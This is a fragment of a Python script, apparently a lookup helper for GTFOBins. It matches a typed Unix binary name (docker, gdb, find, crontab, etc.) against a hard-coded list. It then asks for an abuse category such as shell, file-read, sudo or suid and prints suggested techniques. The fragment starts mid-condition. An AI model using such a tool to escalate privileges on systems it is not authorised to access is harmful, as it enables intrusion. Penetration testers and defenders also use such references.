== "chroot" or start == "clamscan" or start == "cmp" or start == "cobc" or start == "column" or start == "comm" or start == "composer" or start == "cowsay" or start == "cowthink" or start == "cpan" or start == "cpio" or start == "cpulimit" or start == "crash" or start == "crontab" or start == "csh" or start == "csvtool" or start == "cupsfilter" or start == "cut" or start == "dash" or start == "date" or start == "dc" or start == "debugfs" or start == "dialog" or start == "diff" or start == "dig" or start == "distcc" or start == "dmidecode" or start == "dmsetup" or start == "dnf" or start == "docker" or start == "dos2unix" or start == "dotnet" or start == "dpkg" or start == "dstat" or start == "dvips" or start == "dvips" or start == "eb" or start == "ed" or start == "efax" or start == "emacs" or start == "elvish" or start == "enscript" or start == "env" or start == "eqn" or start == "espeak" or start == "ex" or start == "exiftool" or start == "expand" or start == "expect" or start == "facter" or start == "file" or start == "find" or start == "finger" or start == "fish" or start == "flock" or start == "fmt" or start == "fold" or start == "fping" or start == "ftp" or start == "gawk" or start == "gcloud" or start == "gcore" or start == "gdb" or start == "gem" or start == "genie" or start == "genisoimage" or start == "ghc" or start == "ghci" or start == "gimp" or start == "ginsh" or start == "git" or start == "grc" or start == "grep" or start == "gtester" or start == "gzip" or start == "hd" or start == "head" or start == "hexdump" or start == "highlight" or start == "hping3" or start == "other":  
        zip_options = input("Choose following options: Shell, file-read, file-write, sudo, suid\n")

        if zip_options in ["Shell", "file-read", "file-write", "sudo", "suid"]:
            bins = gtfo_bins(start, zip_options)  # Call the gtfo_bins function with the correct arguments
            print("\nSuggested GTFO Bins:\n")
            for bin in bins:
                print(bin)
        else:
            print("\nInvalid option for the chosen tool.\n")
    else:
        print("\nTool not found. Please enter a valid tool name (e.g., 'zip', '7zip', 'base64' or 'other').\n")

if __name__ == "__main__":
    main()